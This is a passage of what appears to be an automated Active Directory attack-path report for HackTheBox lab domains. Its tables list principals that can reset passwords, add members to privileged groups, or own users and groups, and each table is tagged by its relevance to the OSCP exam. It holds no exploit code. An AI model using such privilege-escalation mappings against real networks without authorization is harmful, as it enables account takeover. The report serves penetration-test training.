| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_1FFAB36A2F5F479CB@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_1FFAB36A2F5F479CB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_9B69F1B9D2CC45549@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_9B69F1B9D2CC45549@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXC0A90C9@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXC0A90C9@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXC3D7722@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXC3D7722@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_C75EE099D0A64C91B@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_C75EE099D0A64C91B@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_7C96B981967141EBB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_7C96B981967141EBB@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_1B41C9286325456BB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_1B41C9286325456BB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_CA8C2ED5BDAB4DC9B@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_CA8C2ED5BDAB4DC9B@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_2C8EEF0A09B545ACB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_2C8EEF0A09B545ACB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | $331000-VK4ADACQNUCA@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | $331000-VK4ADACQNUCA@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_681F53D4942840E18@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_681F53D4942840E18@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_75A538D3025E4DB9A@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_75A538D3025E4DB9A@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | DEFAULTACCOUNT@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | DEFAULTACCOUNT@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | GUEST@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | GUEST@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | EXCH01.HTB.LOCAL | ['Computer'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | EXCH01.HTB.LOCAL | ['Computer'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | FOREST.HTB.LOCAL | ['Computer', 'Base', 'Tag_Tier_Zero'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | FOREST.HTB.LOCAL | ['Computer', 'Base', 'Tag_Tier_Zero'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | MARK@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | MARK@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | ANDY@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | ANDY@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | LUCINDA@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | LUCINDA@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SANTI@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SANTI@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SEBASTIEN@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SEBASTIEN@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX0659CC1@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX0659CC1@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXB01AC64@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXB01AC64@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX7108A4E@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX7108A4E@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXFD87238@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXFD87238@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX83D6781@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX83D6781@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX6DED678@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX6DED678@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX968E74D@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX968E74D@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX670628E@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOX670628E@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXC0A90C9@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXC0A90C9@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXC3D7722@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | HEALTHMAILBOXC3D7722@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_7C96B981967141EBB@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_7C96B981967141EBB@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_1FFAB36A2F5F479CB@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_1FFAB36A2F5F479CB@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_C75EE099D0A64C91B@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_C75EE099D0A64C91B@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_9B69F1B9D2CC45549@HTB.LOCAL | ['User', 'Base'] |
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_9B69F1B9D2CC45549@HTB.LOCAL | ['User', 'Base'] |

### [OK] ForceChangePassword Rights
**OSCP Relevance:** HIGH | **Results:** 54

> Find principals who can reset passwords without knowing current password. Direct credential compromise.

| Attacker | CanResetPassword | VictimIsPrivileged |
| --- | --- | --- |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SANTI@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | MARK@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ANDY@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | LUCINDA@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SEBASTIEN@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | MARK@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ANDY@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | LUCINDA@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SANTI@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SEBASTIEN@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |

### [OK] AddMember to Privileged Groups
**OSCP Relevance:** HIGH | **Results:** 24

> Find principals who can add members to privileged groups. Direct path to privilege escalation.

| Attacker | CanAddMembersTo |
| --- | --- |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DNSADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DNSADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL |

### [OK] Owns Relationships on Users/Groups
**OSCP Relevance:** HIGH | **Results:** 79

> Find principals who own other users or groups. Owner can grant themselves full control.

| Owner | OwnedObject | ObjectType |
| --- | --- | --- |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SYSADMINS@HTB.LOCAL | ['Base', 'OU'] |
| DOMAIN ADMINS@HTB.LOCAL | EXCHANGE ADMINISTRATORS@HTB.LOCAL | ['Base', 'OU'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | DEFAULT DOMAIN CONTROLLERS POLICY@HTB.LOCAL | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | DEFAULT DOMAIN POLICY@HTB.LOCAL | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINSDHOLDER@HTB.LOCAL | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base'] |
| ADMINISTRATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | ENTERPRISE KEY ADMINS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | KEY ADMINS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | READ-ONLY DOMAIN CONTROLLERS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | CLONEABLE DOMAIN CONTROLLERS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | ACCOUNT OPERATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | SERVER OPERATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | DOMAIN GUESTS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | DOMAIN USERS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | ENTERPRISE ADMINS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | SCHEMA ADMINS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | DOMAIN CONTROLLERS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| ADMINISTRATORS@EGOTISTICAL-BANK.LOCAL | STORAGE REPLICA ADMINISTRATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
